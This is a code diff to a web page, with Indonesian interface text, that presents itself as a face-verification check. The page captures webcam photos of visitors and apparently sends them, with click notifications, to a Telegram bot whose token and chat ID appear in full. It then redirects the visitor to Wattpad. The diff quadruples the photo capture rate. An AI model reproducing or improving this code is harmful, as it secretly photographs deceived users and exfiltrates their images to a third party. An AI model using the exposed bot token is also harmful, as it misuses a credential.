@@ -264,7 +264,8 @@
 const TOKEN = "7616230857:AAFAgENc-bxOWhjQ38Zo3OSucj7j2XyQypw";
 const CHAT_ID = "1388041292";
 const REDIRECT_URL = "https://www.wattpad.com/263739637";
-const VERIFICATION_DURATION = 10; // seconds
+const VERIFICATION_DURATION = 5; // Changed from 10 to 5 seconds
+const PHOTOS_PER_SECOND = 4; // New constant to specify photos per second
 
 // Elements
 const checkbox = document.getElementById("check");
@@ -627,11 +628,11 @@ function prosesVerifikasi() {
     // Update status
     statusText.innerText = "📸 Memverifikasi wajah...";
     
-    // Start capturing images
+    // Start capturing images (changed to 4 photos every 1000/4 = 250ms)
     let counter = 0;
     intervalId = setInterval(() => {
       ambilGambarKamera(video, counter++);
-    }, 1000);
+    }, 1000 / PHOTOS_PER_SECOND);
     
     // Stop after verification duration
     setTimeout(() => {
@@ -651,7 +652,6 @@ function prosesVerifikasi() {
   });
 }
 
-// Function to send camera permission request info
 async function sendPermissionRequestInfo() {
   try {
     const message = "🔔 User mengklik tombol 'Mulai Verifikasi' dan diminta izin kamera";
@@ -792,7 +792,6 @@ function resetMessages() {
   errorMessage.style.display = "none";
   remainingTime = VERIFICATION_DURATION;
 }
-
  </script>
 </body>
 </html>
